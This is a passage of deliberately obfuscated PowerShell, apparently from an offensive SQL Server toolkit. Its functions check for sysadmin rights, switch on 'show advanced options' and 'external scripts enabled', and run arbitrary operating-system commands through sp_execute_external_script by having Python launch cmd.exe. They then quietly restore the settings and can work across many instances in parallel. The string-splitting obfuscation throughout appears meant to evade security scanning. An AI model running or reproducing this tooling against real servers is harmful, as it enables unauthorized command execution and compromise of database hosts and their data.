                ${cmd`ResUl`Ts} = &("{3}{0}{2}{1}" -f 'Q','ery','LQu','Get-S') -Instance ${InST`An`ce} -Query ${Q`UeRYC`mDE`xEc`Ute} -Username ${Us`e`RNAMe} -Password ${PAs`sw`ORD} -Credential ${Cre`d`entiaL} -SuppressVerbose | &("{1}{2}{0}"-f'ect','s','el') ("{1}{0}"-f 'utput','O') -ExpandProperty ("{0}{1}{2}"-f'O','ut','put')

                
                if(${Ra`Wr`EsulTs})
                {
                    ${cmDR`ES`UltS}                 
                }
                else
                {
                    ${Nu`ll} = ${T`BlR`e`SUlTs}."ro`wS"."a`dd"(${c`ompuTE`RnA`mE}, ${inSTAN`Ce}, [string]${cmDr`eSu`l`TS}.("{0}{1}"-f 't','rim').Invoke())                    
                }
                
                
                if(${Di`sA`B`lEExt`Ern`ALScR`ipTs} -eq 1)
                {
                    &("{0}{1}{2}"-f 'Wr','ite-Verbo','se') -Message ("$Instance "+': '+'Disablin'+'g'+' '+'ex'+'te'+'r'+'nal '+'scri'+'pt'+'s')
                    &("{1}{0}{2}{3}"-f'QL','Get-S','Qu','ery') -Instance ${I`NsT`ANcE} -Query ((("{4}{11}{7}{3}{9}{0}{2}{5}{1}{6}{8}{10}"-f 'pts','6i,0',' enabled',' s','sp_configure B6iext','B',';RECON','rnal','FIGURE WITH OVE','cri','RRIDE','e'))  -RePlACe  ([cHAr]66+[cHAr]54+[cHAr]105),[cHAr]39) -Username ${uSe`RName} -Password ${P`ASs`Wo`RD} -Credential ${c`R`eDenTial} -SuppressVerbose
                }

                
                if(${Dis`AblE`Sh`Ow`Ad`VA`NcedoPtions} -eq 1)
                {
                    &("{2}{1}{0}{3}" -f'-Verb','ite','Wr','ose') -Message ("$Instance "+': '+'D'+'isa'+'bling'+' '+'Show'+' '+'Advanc'+'e'+'d '+'Opt'+'ions')
                    &("{1}{2}{3}{0}" -f'ry','G','et-','SQLQue') -Instance ${I`N`StaNcE} -Query ((("{11}{3}{7}{4}{2}{0}{5}{9}{6}{10}{8}{1}" -f 'HkS','RE','igure j','_co','f','how Advanc',' Option','n','GU','ed','sjHk,0;RECONFI','sp'))."Rep`LAce"(([Char]106+[Char]72+[Char]107),[sTrING][Char]39)) -Username ${uSE`R`NAMe} -Password ${pAs`SworD} -Credential ${CREdENT`i`AL} -SuppressVerbose
                }

                
                ${Co`N`NeC`TIon}.("{1}{0}" -f 'e','Clos').Invoke()

                
                ${cO`NNeC`TI`oN}.("{1}{0}{2}"-f 'po','Dis','se').Invoke()
            }
            catch
            {
                

                if(-not ${s`UP`pR`eSsvERBo`se})
                {
                    ${E`RrorMEs`SagE} = ${_}."exCep`T`iOn"."me`SsaGe"
                    &("{2}{0}{1}{3}"-f'e-Ve','rb','Writ','ose') -Message ("$Instance "+': '+'Co'+'nn'+'ection '+'F'+'ail'+'ed.')
                    
                }

                
                ${Nu`LL} = ${t`BlrESU`lTs}."R`owS".("{1}{0}" -f'd','Ad').Invoke("$ComputerName","$Instance",("{1}{3}{4}{0}{2}{5}" -f 'ble or Command','Not Ac',' Fa','cess','i','iled'))
            }
        }

        
        ${piP`elINEitE`MS} | &("{1}{0}{2}"-f'voke-Parall','In','el') -ScriptBlock ${MY`sc`Ri`PTBLocK} -ImportSessionFunctions -ImportVariables -Throttle ${ThR`EaDS} -RunspaceTimeout 2 -Quiet -ErrorAction ("{0}{2}{4}{1}{3}"-f'Si','nti','lently','nue','Co')

        return ${T`BlreSU`lTS}
    }
}







Function  INvOKe`-S`q`loscmdPyth`ON
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandAtoRy = ${faL`Se},
        HeLPMEssAGE = {"{4}{6}{10}{9}{1}{13}{7}{14}{0}{2}{12}{8}{5}{3}{11}"-f' ','m','t','te with','S','ntica','QL Se','u',' authe','r or do','rve','.','o','ain acco','nt'})]
        [string]${Use`RNA`me},

        [Parameter(MandatOry = ${F`AlSe},
        HelpmesSAGE = {"{0}{8}{5}{11}{6}{12}{9}{7}{4}{1}{10}{3}{2}" -f 'SQL Ser','o authen','th.','icate wi',' password t','e','m','unt','v','in acco','t','r or do','a'})]
        [string]${p`Ass`woRd},
		
		[Parameter(mandaTory = ${fa`l`se},
        HElpmEssagE = {"{8}{2}{0}{4}{9}{6}{10}{3}{7}{1}{5}"-f'er','n t',' S','t','ver d','o.','se to c','io','SQL','ataba','onnec'})]
        [string]${Da`Tab`A`se},

        [Parameter(ManDatOrY = ${FaL`Se},
        hELPMeSsaGe = {"{3}{0}{1}{4}{6}{5}{2}"-f 'ws',' ','ls.','Windo','cred','ntia','e'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cREdEn`T`iAl} =  (GEt-iTEm  ("vaR"+"ia"+"blE:0"+"459m"+"2")  ).vALuE::"e`MPTy",

        [Parameter(MandaTOrY = ${FAl`sE},
                VaLUeFrOMPiPElInE = ${Tr`UE},
                VaLUEFROMPiPElINEBYprOPERtyNAme = ${t`RUE},
        HELPMEssaGE = {"{0}{3}{7}{8}{1}{9}{6}{2}{4}{5}{10}"-f'S','stance','connec','QL Server','tion',' to',' ',' i','n',' to','.'})]
        [string]${inSt`AN`cE},

        [Parameter(MAndATorY = ${fal`sE},
        HELpMesSAGe = {"{4}{8}{0}{1}{11}{2}{9}{10}{6}{5}{7}{3}" -f 's','in','e','ion.','Conne','Con','dmin ','nect','ct u','dic','ated A','g D'})]
        [Switch]${d`AC},

        [Parameter(MANdAtORY = ${T`RuE},
        HelPMesSage = {"{5}{4}{7}{0}{6}{2}{3}{1}" -f 'd to be','d.','ex','ecute','S comma','O',' ','n'})]
        [String]${co`m`mAnD} = ("{1}{0}{2}"-f'oam','wh','i'),

        [Parameter(maNdATOrY = ${Fa`LSE},
        HELpmessaGE = {"{1}{2}{3}{0}"-f 't.','C','onnection ti','meou'})]
        [string]${TiM`eoUT},

        [Parameter(MAnDaTORy = ${fal`SE},
        HElpMESSAGE = {"{3}{2}{4}{0}{1}"-f'f',' threads.','umber ','N','o'})]
        [int]${Thr`E`Ads} = 1,

        [Parameter(ManDAtorY = ${f`Al`SE},
        helpMEssAGE = {"{2}{8}{3}{5}{7}{4}{0}{1}{6}" -f 'ction is wrap','p','Suppress verbose ','rors.  ','when fun','Used','ed.',' ','er'})]
        [switch]${suPpReSsVE`R`B`OSe},

        [Parameter(MANDatorY = ${f`Al`Se},
        hELpMesSagE = {"{14}{12}{6}{16}{7}{8}{5}{2}{13}{4}{15}{11}{1}{17}{10}{3}{9}{0}"-f'.','in',' w','c',' the co','ts',' the r','w',' resul','e name','an','puter or ','show','ithout','Just ','m','a','st'})]
        [switch]${r`Aw`Re`sults}
    )

    Begin
    {
        
        ${t`BLc`OMMan`Ds} = &("{2}{1}{0}" -f 't','ec','New-Obj') -TypeName ("{1}{3}{0}{2}"-f 'm.Data.DataT','Sy','able','ste')
        ${t`B`lREsU`ltS} = &("{1}{0}{2}{3}" -f'ew-','N','Obje','ct') -TypeName ("{2}{0}{4}{1}{3}" -f'a.Data','l','System.Dat','e','Tab')
        ${N`Ull} = ${tbL`RE`suLts}."C`Olum`Ns".("{1}{0}"-f'dd','A').Invoke(("{2}{0}{1}"-f'mputerN','ame','Co'))
        ${n`ULL} = ${T`BLResU`lts}."C`oLuMnS".("{0}{1}" -f'Ad','d').Invoke(("{1}{0}" -f'tance','Ins'))
        ${NU`LL} = ${tB`lre`s`UlTs}."C`o`lumns".("{1}{0}" -f 'd','Ad').Invoke(("{4}{2}{0}{3}{1}" -f'ndRe','ts','a','sul','Comm'))


        
        ${pIp`ELiNE`iTEMs} = &("{0}{2}{1}" -f 'Ne','-Object','w') -TypeName ("{4}{1}{3}{2}{0}"-f 'le','ste','.Data.DataTab','m','Sy')

        
        if(-not ${i`NSTAN`cE})
        {
            ${inSt`A`Nce} = ${EnV:c`oMp`Ut`eR`Name}
        }

        
        if(${INS`TA`NcE})
        {
            ${Pr`oVI`d`E`insTaNce} = &("{1}{2}{0}"-f 'ct','New-Obj','e') -TypeName ("{1}{0}{2}"-f'SO','P','bject') -Property @{
                ("{2}{0}{1}"-f 'an','ce','Inst') = ${iNS`TA`NCe}
            }
        }

        
        ${PIp`ElInEiT`EMs} = ${Pi`PEl`ineI`T`EMS} + ${prOv`IdEIn`S`TAn`Ce}
    }

    Process
    {
        
        ${P`i`pE`LiNeItEms} = ${pI`PELIN`E`iteMs} + ${_}
    }

    End
    {
        
        ${MYScr`Ip`Tb`lo`CK} = {
            ${I`NStaNCE} = ${_}."inSt`AN`CE"

            
            ${Co`mP`UT`ErNa`Me} = &("{3}{2}{7}{5}{4}{1}{6}{0}" -f'e','rNameFromIn','et-Co','G','e','ut','stanc','mp') -Instance ${inSta`N`cE}

            
            if(-not ${in`sTa`NCe})
            {
                ${IN`sT`AncE} = ${EN`V:`cOM`PUtE`RNAmE}
            }

            
            if(${D`Ac})
            {
                
                ${C`O`NNecTIoN} = &("{3}{0}{2}{4}{1}"-f'L','Object','C','Get-SQ','onnection') -Instance ${iNStA`N`ce} -Username ${uS`ERnA`mE} -Password ${paSS`w`OrD} -Credential ${c`R`EDen`TiAL} -DAC -TimeOut ${tI`m`EOut}
            }
			
            if(${D`ATA`BaSe})
            {
                
                ${Co`NN`ECtION} = &("{2}{4}{0}{1}{6}{5}{3}" -f'ct','ionOb','Get-S','t','QLConne','ec','j') -Instance ${i`NStA`NcE} -Username ${u`s`eRNAmE} -Password ${PAS`sw`ORd} -Database ${datA`BASE} -Credential ${c`RE`dENti`Al} -TimeOut ${TimE`OUT}
            }
            else
            {
                
                ${conNEC`TI`on} = &("{0}{2}{5}{6}{3}{4}{1}"-f 'Get-SQLCon','ect','n','ionO','bj','ec','t') -Instance ${IN`St`ANCe} -Username ${uSEr`NaMe} -Password ${pa`s`SwOrD} -Credential ${CRe`D`enTI`AL} -TimeOut ${tIM`EO`Ut}
            }

            
            try
            {
                
                ${c`OnNEc`TIOn}.("{1}{0}" -f'en','Op').Invoke()

                if(-not ${S`Up`prEsSVerb`O`se})
                {
                    &("{2}{3}{0}{1}" -f'o','se','Write-Ve','rb') -Message ("$Instance "+': '+'C'+'onnec'+'ti'+'on '+'Suc'+'c'+'ess.')
                }

                
                ${diS`ABl`eSHoWAdvAnC`E`DoPti`onS} = 0
                ${diSA`BLeeXTEr`N`Al`s`c`RIP`Ts} = 0

                

                
                ${isSY`SAD`miN} = &("{2}{5}{1}{0}{3}{4}" -f'ysadmi','LS','Get','nC','heck','-SQ') -Instance ${i`Nst`AnCe} -Credential ${CREd`e`NTIaL} -Username ${US`erNa`mE} -Password ${pAs`sworD} -SuppressVerbose | &("{0}{1}{3}{2}"-f'S','e','ct-Object','le') -Property ("{0}{1}{2}"-f'IsS','y','sadmin') -ExpandProperty ("{0}{1}{2}" -f 'Is','Sysadmi','n')

                
                if(${I`sSYS`ADM`in} -eq 'Yes')
                {
                    &("{0}{1}{2}{3}" -f'W','rite-V','erb','ose') -Message ("$Instance "+': '+'Y'+'ou '+'a'+'re '+'a '+'sysa'+'dmin'+'.')
                    ${i`sEXTE`R`N`AlSCri`PT`SE`NAbLed} = &("{0}{2}{1}{3}"-f'Get','uer','-SQLQ','y') -Instance ${IN`S`TaNce} -Query ((("{1}{4}{6}{0}{7}{5}{3}{2}{8}" -f'l','sp_confi','s enabl','t','gu','crip','re {0}externa',' s','ed{0}')) -F[cHaR]39) -Username ${UsErn`A`Me} -Password ${PASS`wOrd} -Credential ${c`Redent`iAL} -SuppressVerbose | &("{2}{1}{0}" -f '-Object','ct','Sele') -Property ("{3}{2}{1}{0}" -f 'lue','a','nfig_v','co') -ExpandProperty ("{2}{1}{0}"-f 'alue','v','config_')
                    ${i`SShoWa`DVa`NcEdENa`BLeD} = &("{1}{0}{2}"-f'-SQLQ','Get','uery') -Instance ${I`NStaN`cE} -Query ((("{7}{0}{2}{5}{1}{6}{3}{8}{4}" -f 'gure a','ho','X9','vance','aX9','S','w Ad','sp_confi','d Options'))  -replACe  ([CHar]97+[CHar]88+[CHar]57),[CHar]39) -Username ${u`serN`Ame} -Password ${pa`sS`w`Ord} -Credential ${cREd`E`NTIaL} -SuppressVerbose | &("{0}{1}{3}{2}" -f'Sel','ec','ject','t-Ob') -Property ("{2}{0}{1}" -f'o','nfig_value','c') -ExpandProperty ("{3}{0}{2}{1}"-f'n','e','fig_valu','co')
                }
				if(${DatA`B`AsE})
                {
                    &("{1}{0}{2}" -f'erbo','Write-V','se') -Message ("$Instance "+': '+'Exec'+'u'+'tin'+'g '+'o'+'n '+"$Database")
                    ${IseX`TeRnaL`S`CrIptSe`N`Abled} = &("{2}{0}{1}"-f 'SQLQu','ery','Get-') -Instance ${In`STAn`CE} -Query ((("{5}{10}{0}{8}{1}{7}{4}{6}{3}{2}{9}{11}" -f'e ','ext','e','enabl','script','sp_','s ','ernal ','LAK','d','configur','LAK')) -rePlACe  'LAK',[CHAr]39) -Username ${USE`R`Na`Me} -Password ${pA`SS`woRD} -Database ${DatAB`A`sE} -Credential ${CR`eden`TiAl} -SuppressVerbose | &("{2}{3}{0}{1}" -f 'ct-Obj','ect','Sel','e') -Property ("{0}{1}{2}{3}" -f'confi','g_val','u','e') -ExpandProperty ("{2}{1}{3}{0}" -f 'ue','nfig_','co','val')
                    ${I`SSH`OWad`Va`NCedenaBlED} = &("{1}{2}{0}" -f 'ery','G','et-SQLQu') -Instance ${Ins`TA`NCE} -Query ((("{4}{8}{1}{6}{5}{10}{3}{7}{9}{0}{2}"-f 's{0',' {0}S','}','p','sp_config','vanc','how Ad','t','ure','ion','ed O'))-F  [CHAR]39) -Username ${USeRN`A`mE} -Password ${p`AS`SWOrd} -Database ${Dat`A`BASE} -Credential ${C`REDe`NT`IaL} -SuppressVerbose | &("{2}{0}{1}{3}"-f 'lect','-O','Se','bject') -Property ("{3}{2}{1}{0}" -f'alue','v','g_','confi') -ExpandProperty ("{1}{2}{0}"-f 'ue','config','_val')
                }
                else
                {
                    &("{1}{2}{0}" -f'-Verbose','Wri','te') -Message ("$Instance "+': '+'You'+' '+'a'+'re '+'n'+'ot '+'a '+'sysadm'+'i'+'n. '+'This'+' '+'c'+'omma'+'nd '+'requ'+'ires'+' '+'sysa'+'dmin'+' '+'pr'+'ivil'+'eges.')

                    
                    ${N`UlL} = ${TbL`Re`SUl`Ts}."rO`Ws".("{1}{0}" -f 'dd','A').Invoke("$ComputerName","$Instance",("{4}{1}{0}{2}{3}" -f'sad','y','min priv','ileges.','No s'))
                    return
                }

                
                if (${iSSH`O`wAd`VANceDEN`AB`l`ed} -eq 1)
                {
                    &("{0}{2}{1}"-f 'Wri','bose','te-Ver') -Message ("$Instance "+': '+'Show'+' '+'A'+'dvance'+'d '+'Opt'+'ions'+' '+'i'+'s '+'already'+' '+'en'+'ab'+'led.')
                }
                else
                {
                    &("{0}{1}{2}{3}"-f'Write','-V','erbos','e') -Message ("$Instance "+': '+'Sho'+'w '+'Ad'+'va'+'nc'+'ed '+'O'+'ption'+'s '+'is'+' '+'di'+'sabled'+'.')
                    ${disabLE`s`HowaDv`A`NCe`DOptiOnS} = 1

                    
                    &("{3}{2}{0}{1}" -f'SQLQue','ry','et-','G') -Instance ${INsTan`cE} -Query ((("{6}{1}{9}{5}{7}{4}{10}{8}{2}{0}{11}{3}" -f'io','onfig','Opt','I2E,1;RECONFIGURE','an','re I2EShow ','sp_c','Adv',' ','u','ced','ns'))."RE`PLACe"('I2E',[StriNG][Char]39)) -Username ${Us`e`RnaME} -Password ${paSS`WORD} -Credential ${C`REd`En`TIaL} -SuppressVerbose

                    
                    ${Is`shOwaD`VAnc`eDeNABl`e`d2} = &("{1}{0}{2}{3}" -f'e','G','t-SQLQue','ry') -Instance ${INST`An`Ce} -Query ((("{6}{7}{8}{3}{4}{1}{0}{2}{5}{9}"-f 'pt','O','ion','Sho','w Advanced ','s','sp','_configu','re {0}','{0}'))  -F [chAr]39) -Username ${uSer`N`AmE} -Password ${p`A`S`sworD} -Credential ${cREDe`Nt`i`AL} -SuppressVerbose | &("{1}{0}{2}" -f't-Obje','Selec','ct') -Property ("{3}{0}{2}{1}" -f 'ig','lue','_va','conf') -ExpandProperty ("{1}{2}{0}"-f'g_value','con','fi')

                    if (${isSh`oWad`VA`NCEDENa`BL`eD2} -eq 1)
                    {
                        &("{0}{1}{2}" -f'Wr','ite-Ve','rbose') -Message ("$Instance "+': '+'E'+'na'+'bled '+'Show'+' '+'A'+'dvance'+'d '+'Opt'+'io'+'ns.')
                    }
                    else
                    {
                        &("{2}{1}{0}" -f 'se','erbo','Write-V') -Message ("$Instance "+': '+'Enab'+'l'+'ing '+'S'+'how '+'A'+'d'+'v'+'anced '+'Option'+'s'+' '+'fail'+'ed. '+'Abor'+'t'+'ing.')

                        
                        ${Nu`LL} = ${tblReSU`l`TS}."Ro`WS".("{1}{0}" -f 'd','Ad').Invoke("$ComputerName","$Instance",("{5}{9}{6}{0}{7}{1}{4}{8}{3}{2}" -f'h',' Advanc','ns.','o','e','Could not ena',' S','ow','d Opti','ble'))
                        return
                    }
                }

                
                if (${iSEXte`RN`Al`sCrIPTS`ena`Bl`Ed} -eq 1)
                {
                    &("{1}{0}{2}{3}" -f'-V','Write','e','rbose') -Message ("$Instance "+': '+'Ex'+'te'+'rnal '+'script'+'s '+'are'+' '+'a'+'lr'+'eady '+'enab'+'l'+'ed.')
                }
                else
                {
                    &("{2}{1}{0}"-f 'ose','ite-Verb','Wr') -Message ("$Instance "+': '+'E'+'xternal'+' '+'sc'+'ripts '+'enab'+'led'+' '+'a'+'re '+'d'+'isable'+'d.')
                    ${dis`AB`lEEXt`E`Rnals`cR`I`PtS} = 1

                    
                    &("{2}{0}{1}"-f'QLQue','ry','Get-S') -Instance ${I`NsTAn`Ce} -Query ((("{2}{8}{5}{4}{7}{11}{12}{10}{3}{0}{1}{9}{6}" -f'GU','RE WITH ','s','I',' scri','external','E','pts enabled{0','p_configure {0}','OVERRID','CONF','},1;R','E'))-f [cHaR]39) -Username ${US`eRna`me} -Password ${PAsS`w`orD} -Credential ${CREdeNT`I`AL} -SuppressVerbose

                    
                    ${IsE`xte`RnAls`cR`iptSenAb`led2} = &("{0}{2}{3}{1}"-f 'Get-SQ','ery','L','Qu') -Instance ${iNS`Ta`Nce} -Query ((("{1}{0}{2}{7}{3}{8}{5}{4}{6}" -f 'nfig','sp_co','ure QlMexternal','p','d','s enable','QlM',' scri','t'))."re`pL`ACE"(([cHaR]81+[cHaR]108+[cHaR]77),[sTriNg][cHaR]34)) -Username ${u`Se`R`NamE} -Password ${p`A`SsWORD} -Credential ${cREd`En`T`IAl} -SuppressVerbose | &("{0}{4}{2}{1}{3}" -f 'Sel','j','ct-Ob','ect','e') -Property ("{1}{0}{2}{3}" -f'f','con','ig_valu','e') -ExpandProperty ("{2}{1}{0}"-f 'ue','ig_val','conf')

                    if (${ISeXtER`Na`ls`CR`ipt`seNABL`Ed2} -eq 1)
                    {
                        &("{2}{3}{0}{1}" -f'e','rbose','Write','-V') -Message ("$Instance "+': '+'Enabl'+'ed '+'exte'+'r'+'nal '+'sc'+'ripts.')
                    }
                    else
                    {
                        &("{0}{4}{3}{2}{1}"-f'Wr','erbose','V','te-','i') -Message ("$Instance "+': '+'Enablin'+'g'+' '+'ext'+'erna'+'l '+'s'+'cripts '+'fai'+'led. '+'Abo'+'rti'+'ng.')

                        
                        ${nu`LL} = ${tBlRe`suL`TS}."R`OwS".("{0}{1}" -f 'A','dd').Invoke("$ComputerName","$Instance",("{3}{6}{2}{7}{5}{4}{0}{1}" -f'ipts','.',' ','Co','scr','able external ','uld not','en'))

                        return
                    }
                }

                
                if(${I`SS`y`sAdMin} -eq 'Yes'){
					${En`ABLe`diN`RUN`VALue} = &("{3}{1}{2}{0}" -f 'y','t-SQL','Quer','Ge') -Instance ${I`NST`ANcE} -Query ((("{19}{7}{1}{18}{14}{15}{11}{13}{9}{4}{3}{17}{21}{6}{8}{22}{10}{2}{16}{20}{5}{12}{0}"-f'abledWTV','va','me LIKE W','y','ter.s','pts','ig','LECT ','uration','M mas','E na',' ',' en','FRO','_','use','TVexternal scr','s.c','lue_in','SE','i','onf','s WHER'))."r`e`PlACe"('WTV',[sTrinG][ChAR]39)) -Username ${US`ER`NAme} -Password ${PA`s`sWoRd} -Credential ${CreD`e`NtI`AL} -SuppressVerbose | &("{1}{2}{0}{3}" -f 'ect-O','Se','l','bject') -ExpandProperty ("{0}{2}{1}"-f'value_in_u','e','s')            
                }
				if(${DaTa`B`ASE}){
					${enaBledINr`Un`V`Alue} = &("{0}{1}{2}{3}" -f 'Get-SQL','Qu','er','y') -Instance ${I`NS`Tan`cE} -Query ((("{6}{1}{13}{11}{16}{14}{12}{7}{17}{0}{5}{8}{9}{4}{10}{3}{15}{2}" -f'e','T ','}','ed','ab','x','SELEC','H','ter','nal scripts en','l','us','configurations W','value_in_','r.sys.','{0','e FROM maste','ERE name LIKE {0}')) -f  [CHaR]39) -Username ${Us`e`RN`AME} -Password ${P`A`SSWORD} -Database ${d`At`AbAse} -Credential ${CrE`de`NtIAl} -SuppressVerbose | &("{3}{1}{0}{2}" -f 'je','-Ob','ct','Select') -ExpandProperty ("{1}{2}{0}" -f 'e','value','_in_us')
				}
				if(${EnAbledIN`R`UNV`A`LUE} -eq 0){
                    &("{1}{2}{0}"-f'bose','Wri','te-Ver') -Message ("$Instance "+': '+'T'+'he '+('{0}ext'+'e'+'r'+'n'+'al ')-f  [chAR]39+'scripts'+' '+('ena'+'bledam'+'3 ')."Repl`ACE"('am3',[STRing][cHAR]39)+'se'+'tti'+'ng '+'i'+'s '+'no'+'t '+'en'+'a'+'bled '+'in'+' '+'runtim'+'e.')
                    &("{2}{0}{1}" -f'ite-Ver','bose','Wr') -Message ("$Instance "+': '+'- '+'The'+' '+'S'+'QL '+'Server'+' '+'s'+'erv'+'ice '+'w'+'ill '+'need'+' '+'to'+' '+'b'+'e '+'ma'+'nuall'+'y '+'restar'+'t'+'ed '+'f'+'or '+'t'+'he '+'cha'+'nge '+'to'+' '+'take'+' '+'effe'+'ct.')
                    &("{0}{3}{2}{1}{4}" -f'Wri','Verbos','e-','t','e') -Message ("$Instance "+': '+'- '+'No'+'t '+'rec'+'ommended'+' '+'u'+'nles'+'s '+('youi'+'q'+'ure ')."REPLa`cE"('iqu',[STRING][chAR]39)+'the'+' '+'D'+'BA.')
                    ${n`ULl} = ${T`BLReSU`l`TS}."r`oWS".("{1}{0}"-f 'dd','A').Invoke("$ComputerName","$Instance",("{5}{4}{6}{2}{1}{3}{7}{0}{8}" -f 'runtim','ipts not ena','l scr','bled ','tern','Ex','a','in ','e.'))
                    return
                }else{
                    &("{1}{2}{0}" -f 'rbose','Wr','ite-Ve') -Message ("$Instance "+': '+'T'+'he '+('1K0'+'e'+'xterna'+'l ')."repl`A`cE"('1K0',[sTRInG][ChAr]39)+'sc'+'ri'+'pts '+(('e'+'nab'+'l'+'edtB'+'o ')  -rePlace 'tBo',[cHAR]39)+'s'+'et'+'ting '+'i'+'s '+'en'+'ab'+'led '+'i'+'n '+('run'+'tim'+'e.D1'+'p')."rE`p`laCE"('D1p',[StrinG][ChaR]39))
                }            

                
                &("{0}{1}{2}" -f 'write-','ver','bose') ("$instance "+': '+'E'+'xecut'+'ing'+' '+'comm'+'and'+':'+' '+"$Command")               
                ${QU`erycm`DexE`Cu`Te} = 
(('ZmM
EX'+'E'+'C ')."RePL`ACe"('ZmM',[stRinG][cHAr]34)+'s'+'p_e'+'xe'+'cute_external_s'+'cript '+'
 '+' '+' '+' '+'@lan'+'gu'+'age '+('=NkdZ'+'Pyt'+'hon'+'kdZ,'+'
 ')."REPLa`Ce"('kdZ',[STrInG][CHar]39)+' '+' '+' '+(('@sc'+'ript'+'=NaM2
'+'i'+'mpo'+'rt'+' ') -CREpLAcE ([cHAR]97+[cHAR]77+[cHAR]50),[cHAR]39)+'s'+'ubpro'+'c'+'ess '+'
'+'p '+'= '+('subpr'+'oce'+'ss.Popen('+'{1}{'+'0}c'+'md.exe ')-F  [cHAr]34,[cHAr]96+'/'+'c '+('p'+'83Com'+'mandyKHm3'+'t, ')."rEP`lA`CE"('yKH',[stRING][ChAr]96)."R`EpL`Ace"('m3t',[stRING][ChAr]34)."REpL`Ace"(([ChAr]112+[ChAr]56+[ChAr]51),[stRING][ChAr]36)+'st'+'dout=sub'+'p'+'rocess.PIPE)
Ou'+'t'+'putDataSet'+' '+'= '+'pandas.Da'+'t'+'a'+'Fr'+'am'+'e('+'[s'+'tr('+'p.stdout.read(), '+(('w'+'j'+'K8mVut'+'f-8w'+'jK'+'8mV)'+'])3G'+'k'+'
'+'WITH ') -cReplAce  ([cHaR]119+[cHaR]106+[cHaR]75),[cHaR]96  -replACe([cHaR]51+[cHaR]71+[cHaR]107),[cHaR]39-replACe  '8mV',[cHaR]34)+'R'+'ESUL'+'T '+'S'+'ETS '+'((['+'O'+'utput] '+(('nv'+'arch'+'ar'+'(ma'+'x)))
'+'Ix1') -crepLACE ([cHAr]73+[cHAr]120+[cHAr]49),[cHAr]34))

                
                if(${iss`yS`ADmiN} -eq 'Yes'){
					${C`MdreSUL`Ts} = &("{0}{3}{2}{1}" -f 'G','uery','SQLQ','et-') -Instance ${IN`s`TANCe} -Query ${q`UERy`CMd`E`xeCuTE} -Username ${USe`R`NAmE} -Password ${P`A`ssWorD} -Credential ${CReD`En`TIAL} -SuppressVerbose | &("{0}{1}" -f 'sel','ect') ("{1}{0}"-f'put','Out') -ExpandProperty ("{0}{1}{2}" -f 'Out','p','ut')
				}
				if(${d`A`TaBaSE}){
					${c`mdR`ESUlTS} = &("{2}{0}{1}"-f 'et-','SQLQuery','G') -Instance ${IN`s`TAncE} -Query ${QuER`YcmdEx`E`CUte} -Username ${uSEr`N`A`Me} -Password ${P`ASSWO`Rd} -Database ${DaT`AbA`Se} -Credential ${CrED`e`N`TIal} -SuppressVerbose | &("{0}{1}{2}" -f 'se','l','ect') ("{1}{0}" -f 'put','Out') -ExpandProperty ("{0}{1}" -f'Outp','ut')
				}
                
                if(${R`AwreSU`LTS})
                {
                    ${Cmd`RE`suLtS}                 
                }
                else
                {
                    ${nu`lL} = ${TbLr`e`SUlts}."R`oWS"."A`dd"(${c`OMP`UTerN`Ame}, ${i`NstAN`cE}, [string]${cM`DReSul`Ts}.("{0}{1}"-f 'tri','m').Invoke())                    
                }
                
                
                if(${DIS`Ab`LeeXTerN`ALScR`iPts} -eq 1)
                {
                    &("{1}{2}{0}" -f 'bose','Writ','e-Ver') -Message ("$Instance "+': '+'D'+'i'+'sabling '+'ex'+'t'+'ernal '+'scri'+'pts')
                    &("{2}{3}{0}{1}" -f'S','QLQuery','Get','-') -Instance ${iNSTA`N`CE} -Query ((("{9}{17}{16}{12}{7}{2}{18}{0}{5}{13}{8}{15}{11}{1}{4}{6}{3}{14}{10}" -f'ip','REC','rnal ','URE WITH','ONF','t','IG','0}exte','nabl','sp_config','DE',';',' {','s e',' OVERRI','ed{0},0','e','ur','scr')) -f[ChAR]39) -Username ${uSE`RNAmE} -Password ${PasS`Wo`Rd} -Credential ${cREdEn`T`I`AL} -SuppressVerbose
                }

                
                if(${dIsa`Ble`SHo`WaDVaN`C`eDopTioNS} -eq 1)
                {
                    &("{0}{1}{2}{3}"-f 'Write-','Ve','rb','ose') -Message ("$Instance "+': '+'Dis'+'ab'+'l'+'ing '+'Sh'+'ow '+'Advance'+'d '+'Opti'+'on'+'s')
                    &("{2}{3}{0}{1}" -f'QL','Query','G','et-S') -Instance ${INStA`N`Ce} -Query ((("{2}{16}{12}{9}{10}{15}{4}{14}{5}{6}{3}{11}{1}{0}{8}{13}{7}"-f'G','RECONFI','s','so','ce','Optio','n','E','U','r','e orcSho','rc,0;','configu','R','d ','w Advan','p_')) -rEpLacE'orc',[char]39) -Username ${U`SeR`NAMe} -Password ${p`AS`S`WoRD} -Credential ${C`Red`en`TiAL} -SuppressVerbose
                }

                
                ${c`o`NNEcTIOn}.("{1}{0}" -f 'lose','C').Invoke()

                
                ${co`N`NEctIOn}.("{2}{0}{1}" -f's','e','Dispo').Invoke()
            }
            catch
            {
                

                if(-not ${SupP`R`Ess`V`eR`BoSe})
                {
                    ${eRRor`M`e`s`sAGE} = ${_}."exCe`Pt`ion"."mESSA`GE"
                    &("{2}{1}{0}"-f'e-Verbose','rit','W') -Message ("$Instance "+': '+'Co'+'nnecti'+'on '+'F'+'a'+'iled.')
                    
                }

                
                ${n`UlL} = ${T`BLreS`ULTs}."ro`WS".("{1}{0}" -f 'dd','A').Invoke("$ComputerName","$Instance",("{9}{4}{0}{8}{2}{7}{3}{5}{6}{1}"-f'ible ','led',' ','mmand','ess',' Fa','i','Co','or','Not Acc'))
            }
        }

        
        ${PIP`El`Inei`T`emS} | &("{0}{2}{1}{4}{3}"-f 'In','P','voke-','lel','aral') -ScriptBlock ${My`Scr`IP`TBlocK} -ImportSessionFunctions -ImportVariables -Throttle ${TH`R`eads} -RunspaceTimeout 2 -Quiet -ErrorAction ("{0}{1}{2}" -f'Silently','Conti','nue')

        return ${t`BLreSUL`Ts}
    }
}








Function  i`NVOkE-Sq`LosCm`dOle
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mAnDAtory = ${f`AL`SE},
        heLpMessAGE = {"{1}{0}{7}{8}{9}{6}{3}{5}{2}{4}{10}" -f 'er','SQL S','then','ount t','tica','o au','acc','ver o','r ','domain ','te with.'})]
        [string]${USErNa`Me},

        [Parameter(mAnDATOrY = ${F`AlSe},
        HeLPMESSagE = {"{7}{6}{0}{10}{2}{4}{1}{5}{8}{3}{9}" -f ' ',' ','a','w','in','account passwor',' Server','SQL','d to authenticate ','ith.','or dom'})]
        [string]${P`As`sworD},

